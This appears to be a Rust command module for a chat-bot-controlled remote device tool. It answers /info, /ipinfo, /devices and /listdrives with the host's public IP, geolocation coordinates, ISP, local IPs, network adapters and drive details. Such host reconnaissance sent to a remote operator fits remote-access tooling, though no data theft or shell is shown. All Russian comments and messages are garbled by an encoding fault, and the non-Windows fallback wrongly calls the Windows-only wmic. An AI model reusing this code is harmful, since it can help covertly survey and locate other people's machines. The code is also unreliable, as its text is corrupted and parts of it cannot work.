use std::process::Command;
use std::os::windows::ffi::OsStrExt;
use std::ffi::OsStr;
use anyhow::{Result, Context};
use serde_json::Value;

use crate::device_manager::DeviceManager;
use crate::config::IP_INFO_URL;

/// –í—ã–ø–æ–ª–Ω—è–µ—Ç –∫–æ–º–∞–Ω–¥—É /info - –ø–æ–ª—É—á–∞–µ—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ
pub async fn handle_info_command(device_manager: &DeviceManager, device_id: &str) -> Result<String> {
    if !device_manager.is_valid_device_id(device_id) {
        return Ok(format!("‚ùå –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ —Å ID `{}` –Ω–µ –Ω–∞–π–¥–µ–Ω–æ", device_id));
    }

    if let Some(device) = device_manager.get_current_device() {
        device_manager.update_device_activity(device_id);
        Ok(device.format_info())
    } else {
        Ok("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ".to_string())
    }
}

/// –í—ã–ø–æ–ª–Ω—è–µ—Ç –∫–æ–º–∞–Ω–¥—É /ipinfo - –ø–æ–ª—É—á–∞–µ—Ç –ø–æ–¥—Ä–æ–±–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ–± IP –∏ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–∏
pub async fn handle_ipinfo_command(device_manager: &DeviceManager, device_id: &str) -> Result<String> {
    if !device_manager.is_valid_device_id(device_id) {
        return Ok(format!("‚ùå –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ —Å ID `{}` –Ω–µ –Ω–∞–π–¥–µ–Ω–æ", device_id));
    }

    device_manager.update_device_activity(device_id);

    // –ü–æ–ª—É—á–∞–µ–º –ø–æ–¥—Ä–æ–±–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ–± IP
    match get_detailed_ip_info().await {
        Ok(info) => Ok(format_ip_info(&info)),
        Err(e) => Ok(format!("‚ùå –û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è IP –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏: {}", e))
    }
}

/// –í—ã–ø–æ–ª–Ω—è–µ—Ç –∫–æ–º–∞–Ω–¥—É /devices - –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç —Å–ø–∏—Å–æ–∫ –≤—Å–µ—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤
pub async fn handle_devices_command(device_manager: &DeviceManager) -> Result<String> {
    let devices_list = device_manager.format_devices_list();
    Ok(devices_list)
}

/// –í—ã–ø–æ–ª–Ω—è–µ—Ç –∫–æ–º–∞–Ω–¥—É /listdrives - –ø–æ–ª—É—á–∞–µ—Ç —Å–ø–∏—Å–æ–∫ –¥–∏—Å–∫–æ–≤
pub async fn handle_listdrives_command(device_manager: &DeviceManager, device_id: &str) -> Result<String> {
    if !device_manager.is_valid_device_id(device_id) {
        return Ok(format!("‚ùå –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ —Å ID `{}` –Ω–µ –Ω–∞–π–¥–µ–Ω–æ", device_id));
    }

    device_manager.update_device_activity(device_id);

    match get_drives_list() {
        Ok(drives) => Ok(format_drives_list(&drives)),
        Err(e) => Ok(format!("‚ùå –û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è —Å–ø–∏—Å–∫–∞ –¥–∏—Å–∫–æ–≤: {}", e))
    }
}

/// –ü–æ–ª—É—á–∞–µ—Ç –ø–æ–¥—Ä–æ–±–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ–± IP –∞–¥—Ä–µ—Å–µ
async fn get_detailed_ip_info() -> Result<Value> {
    let client = reqwest::Client::new();
    
    // –ü—ã—Ç–∞–µ–º—Å—è –ø–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é —Å –æ—Å–Ω–æ–≤–Ω–æ–≥–æ API
    match client.get(IP_INFO_URL).send().await {
        Ok(response) => {
            if response.status().is_success() {
                let json: Value = response.json().await
                    .context("Failed to parse IP info JSON")?;
                return Ok(json);
            }
        }
        Err(_) => {}
    }

    // –ï—Å–ª–∏ –æ—Å–Ω–æ–≤–Ω–æ–π API –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω, –ø—ã—Ç–∞–µ–º—Å—è –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–µ
    let backup_urls = [
        "https://ipapi.co/json/",
        "https://httpbin.org/ip",
        "https://api.ipify.org?format=json"
    ];

    for url in &backup_urls {
        if let Ok(response) = client.get(*url).send().await {
            if response.status().is_success() {
                if let Ok(json) = response.json::<Value>().await {
                    return Ok(json);
                }
            }
        }
    }

    Err(anyhow::anyhow!("–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ–± IP"))
}

/// –§–æ—Ä–º–∞—Ç–∏—Ä—É–µ—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ–± IP –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏
fn format_ip_info(info: &Value) -> String {
    let mut result = String::from("üåê **IP –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è:**\n\n");

    // –û—Å–Ω–æ–≤–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è
    if let Some(ip) = info.get("ip").and_then(|v| v.as_str()) {
        result.push_str(&format!("üìç **IP –∞–¥—Ä–µ—Å:** `{}`\n", ip));
    }

    // –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–∏
    if let Some(country) = info.get("country_name").and_then(|v| v.as_str()) {
        result.push_str(&format!("üè¥ **–°—Ç—Ä–∞–Ω–∞:** {}\n", country));
    }

    if let Some(region) = info.get("region").and_then(|v| v.as_str()) {
        result.push_str(&format!("üó∫Ô∏è **–†–µ–≥–∏–æ–Ω:** {}\n", region));
    }

    if let Some(city) = info.get("city").and_then(|v| v.as_str()) {
        result.push_str(&format!("üèôÔ∏è **–ì–æ—Ä–æ–¥:** {}\n", city));
    }

    if let Some(postal) = info.get("postal").and_then(|v| v.as_str()) {
        result.push_str(&format!("üìÆ **–ü–æ—á—Ç–æ–≤—ã–π –∫–æ–¥:** {}\n", postal));
    }

    // –ö–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã
    if let (Some(lat), Some(lon)) = (
        info.get("latitude").and_then(|v| v.as_f64()),
        info.get("longitude").and_then(|v| v.as_f64())
    ) {
        result.push_str(&format!("üó∫Ô∏è **–ö–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã:** {:.4}, {:.4}\n", lat, lon));
    }

    // –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø—Ä–æ–≤–∞–π–¥–µ—Ä–µ
    if let Some(isp) = info.get("org").and_then(|v| v.as_str()) {
        result.push_str(&format!("üåê **–ü—Ä–æ–≤–∞–π–¥–µ—Ä:** {}\n", isp));
    }

    // –ß–∞—Å–æ–≤–æ–π –ø–æ—è—Å
    if let Some(timezone) = info.get("timezone").and_then(|v| v.as_str()) {
        result.push_str(&format!("üïê **–ß–∞—Å–æ–≤–æ–π –ø–æ—è—Å:** {}\n", timezone));
    }

    // –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–∞—è —Ç–µ—Ö–Ω–∏—á–µ—Å–∫–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è
    result.push_str("\n**–¢–µ—Ö–Ω–∏—á–µ—Å–∫–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è:**\n");
    
    // –õ–æ–∫–∞–ª—å–Ω—ã–µ IP –∞–¥—Ä–µ—Å–∞
    if let Ok(local_ips) = get_local_ip_addresses() {
        result.push_str(&format!("üè† **–õ–æ–∫–∞–ª—å–Ω—ã–µ IP:** {}\n", local_ips.join(", ")));
    }

    // –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–µ—Ç–µ–≤—ã—Ö –∞–¥–∞–ø—Ç–µ—Ä–∞—Ö
    if let Ok(adapters) = get_network_adapters() {
        result.push_str(&format!("üîå **–°–µ—Ç–µ–≤—ã–µ –∞–¥–∞–ø—Ç–µ—Ä—ã:** {}\n", adapters.join(", ")));
    }

    result
}

/// –ü–æ–ª—É—á–∞–µ—Ç —Å–ø–∏—Å–æ–∫ –¥–∏—Å–∫–æ–≤
fn get_drives_list() -> Result<Vec<DriveInfo>> {
    let mut drives = Vec::new();

    // –ò—Å–ø–æ–ª—å–∑—É–µ–º Windows API –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Å–ø–∏—Å–∫–∞ –¥–∏—Å–∫–æ–≤
    #[cfg(windows)]
    {
        use windows::Win32::Storage::FileSystem::{GetLogicalDrives, GetDriveTypeW, GetVolumeInformationW};
        use windows::Win32::Foundation::MAX_PATH;

        unsafe {
            let drive_mask = GetLogicalDrives();
            
            for i in 0..26 {
                if (drive_mask & (1 << i)) != 0 {
                    let drive_letter = char::from(b'A' + i as u8);
                    let drive_path = format!("{}:\\", drive_letter);
                    
                    let drive_path_wide: Vec<u16> = OsStr::new(&drive_path)
                        .encode_wide()
                        .chain(std::iter::once(0))
                        .collect();

                    let drive_type = GetDriveTypeW(windows::core::PCWSTR::from_raw(drive_path_wide.as_ptr()));
                    
                    let drive_type_str = match drive_type {
                        2 => "–°—ä–µ–º–Ω—ã–π –¥–∏—Å–∫",
                        3 => "–ñ–µ—Å—Ç–∫–∏–π –¥–∏—Å–∫",
                        4 => "–°–µ—Ç–µ–≤–æ–π –¥–∏—Å–∫",
                        5 => "CD/DVD",
                        6 => "RAM –¥–∏—Å–∫",
                        _ => "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ",
                    };

                    // –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –æ–±—ä–µ–º–µ
                    let mut volume_name = vec![0u16; MAX_PATH as usize];
                    let mut file_system = vec![0u16; MAX_PATH as usize];
                    let mut serial_number = 0u32;
                    let mut max_component_length = 0u32;
                    let mut file_system_flags = 0u32;

                    let volume_info_result = GetVolumeInformationW(
                        windows::core::PCWSTR::from_raw(drive_path_wide.as_ptr()),
                        Some(&mut volume_name),
                        Some(&mut serial_number),
                        Some(&mut max_component_length),
                        Some(&mut file_system_flags),
                        Some(&mut file_system),
                    );

                    let volume_label = if volume_info_result.is_ok() {
                        String::from_utf16_lossy(&volume_name).trim_end_matches('\0').to_string()
                    } else {
                        "–ù–µ—Ç –º–µ—Ç–∫–∏".to_string()
                    };

                    let file_system_name = if volume_info_result.is_ok() {
                        String::from_utf16_lossy(&file_system).trim_end_matches('\0').to_string()
                    } else {
                        "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ".to_string()
                    };

                    // –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Å–≤–æ–±–æ–¥–Ω–æ–º –º–µ—Å—Ç–µ
                    let space_info = get_disk_space(&drive_path);

                    drives.push(DriveInfo {
                        letter: drive_letter,
                        path: drive_path,
                        drive_type: drive_type_str.to_string(),
                        label: volume_label,
                        file_system: file_system_name,
                        total_space: space_info.0,
                        free_space: space_info.1,
                    });
                }
            }
        }
    }

    // –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π –º–µ—Ç–æ–¥ —á–µ—Ä–µ–∑ –∫–æ–º–∞–Ω–¥—É wmic
    #[cfg(not(windows))]
    {
        let output = Command::new("wmic")
            .args(&["logicaldisk", "get", "size,freespace,caption,volumename,filesystem", "/format:csv"])
            .output()
            .context("Failed to execute wmic command")?;

        let output_str = String::from_utf8_lossy(&output.stdout);
        for line in output_str.lines().skip(1) {
            let parts: Vec<&str> = line.split(',').collect();
            if parts.len() >= 6 {
                drives.push(DriveInfo {
                    letter: parts[1].chars().next().unwrap_or('?'),
                    path: parts[1].to_string(),
                    drive_type: "–î–∏—Å–∫".to_string(),
                    label: parts[5].to_string(),
                    file_system: parts[2].to_string(),
                    total_space: parts[4].parse().unwrap_or(0),
                    free_space: parts[3].parse().unwrap_or(0),
                });
            }
        }
    }

    Ok(drives)
}

/// –°—Ç—Ä—É–∫—Ç—É—Ä–∞ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –¥–∏—Å–∫–µ
#[derive(Debug)]
struct DriveInfo {
    letter: char,
    path: String,
    drive_type: String,
    label: String,
    file_system: String,
    total_space: u64,
    free_space: u64,
}

/// –§–æ—Ä–º–∞—Ç–∏—Ä—É–µ—Ç —Å–ø–∏—Å–æ–∫ –¥–∏—Å–∫–æ–≤ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏
fn format_drives_list(drives: &[DriveInfo]) -> String {
    let mut result = String::from("üíæ **–°–ø–∏—Å–æ–∫ –¥–∏—Å–∫–æ–≤:**\n\n");

    for drive in drives {
        let used_space = drive.total_space.saturating_sub(drive.free_space);
        let usage_percent = if drive.total_space > 0 {
            (used_space as f64 / drive.total_space as f64 * 100.0) as u32
        } else {
            0
        };

        let progress_bar = create_progress_bar(usage_percent);

        result.push_str(&format!(
            "üíø **{}:** `{}`\n\
            ‚îî üè∑Ô∏è {}\n\
            ‚îî üìÅ {} | üíæ {}\n\
            ‚îî üìä {} ({}/{})\n\
            ‚îî {}\n\n",
            drive.letter,
            drive.path,
            if drive.label.is_empty() { "–ë–µ–∑ –º–µ—Ç–∫–∏" } else { &drive.label },
            drive.drive_type,
            drive.file_system,
            format!("{}%", usage_percent),
            format_bytes(used_space),
            format_bytes(drive.total_space),
            progress_bar
        ));
    }

    if drives.is_empty() {
        result.push_str("‚ùå –î–∏—Å–∫–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã");
    }

    result
}

/// –ü–æ–ª—É—á–∞–µ—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –¥–∏—Å–∫–æ–≤–æ–º –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–µ
fn get_disk_space(path: &str) -> (u64, u64) {
    #[cfg(windows)]
    {
        use windows::Win32::Storage::FileSystem::GetDiskFreeSpaceExW;

        let path_wide: Vec<u16> = OsStr::new(path)
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();

        unsafe {
            let mut free_bytes = 0u64;
            let mut total_bytes = 0u64;
            
            let result = GetDiskFreeSpaceExW(
                windows::core::PCWSTR::from_raw(path_wide.as_ptr()),
                Some(&mut free_bytes),
                Some(&mut total_bytes),
                None,
            );

            if result.is_ok() {
                return (total_bytes, free_bytes);
            }
        }
    }

    (0, 0)
}

/// –ü–æ–ª—É—á–∞–µ—Ç —Å–ø–∏—Å–æ–∫ –ª–æ–∫–∞–ª—å–Ω—ã—Ö IP –∞–¥—Ä–µ—Å–æ–≤
fn get_local_ip_addresses() -> Result<Vec<String>> {
    let output = Command::new("ipconfig")
        .output()
        .context("Failed to execute ipconfig")?;

    let output_str = String::from_utf8_lossy(&output.stdout);
    let mut ips = Vec::new();

    for line in output_str.lines() {
        if line.trim().starts_with("IPv4") && line.contains(':') {
            if let Some(ip) = line.split(':').nth(1) {
                let ip = ip.trim();
                if !ip.starts_with("127.") && !ip.starts_with("169.254.") {
                    ips.push(ip.to_string());
                }
            }
        }
    }

    Ok(ips)
}

/// –ü–æ–ª—É—á–∞–µ—Ç —Å–ø–∏—Å–æ–∫ —Å–µ—Ç–µ–≤—ã—Ö –∞–¥–∞–ø—Ç–µ—Ä–æ–≤
fn get_network_adapters() -> Result<Vec<String>> {
    let output = Command::new("wmic")
        .args(&["path", "win32_networkadapter", "where", "netconnectionstatus=2", "get", "name", "/value"])
        .output()
        .context("Failed to execute wmic")?;

    let output_str = String::from_utf8_lossy(&output.stdout);
    let mut adapters = Vec::new();

    for line in output_str.lines() {
        if line.starts_with("Name=") {
            let name = line.replace("Name=", "").trim().to_string();
            if !name.is_empty() {
                adapters.push(name);
            }
        }
    }

    Ok(adapters)
}

/// –§–æ—Ä–º–∞—Ç–∏—Ä—É–µ—Ç —Ä–∞–∑–º–µ—Ä –≤ –±–∞–π—Ç–∞—Ö –≤ —á–∏—Ç–∞–µ–º—ã–π —Ñ–æ—Ä–º–∞—Ç
fn format_bytes(bytes: u64) -> String {
    const UNITS: &[&str] = &["B", "KB", "MB", "GB", "TB"];
    
    if bytes == 0 {
        return "0 B".to_string();
    }

    let mut size = bytes as f64;
    let mut unit_index = 0;

    while size >= 1024.0 && unit_index < UNITS.len() - 1 {
        size /= 1024.0;
        unit_index += 1;
    }

    format!("{:.1} {}", size, UNITS[unit_index])
}

/// –°–æ–∑–¥–∞–µ—Ç –ø—Ä–æ–≥—Ä–µ—Å—Å-–±–∞—Ä –¥–ª—è –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –¥–∏—Å–∫–∞
fn create_progress_bar(percent: u32) -> String {
    const BAR_WIDTH: usize = 20;
    let filled = (percent as usize * BAR_WIDTH) / 100;
    let empty = BAR_WIDTH - filled;

    format!("[{}{}]", "‚ñà".repeat(filled), "‚ñë".repeat(empty))
}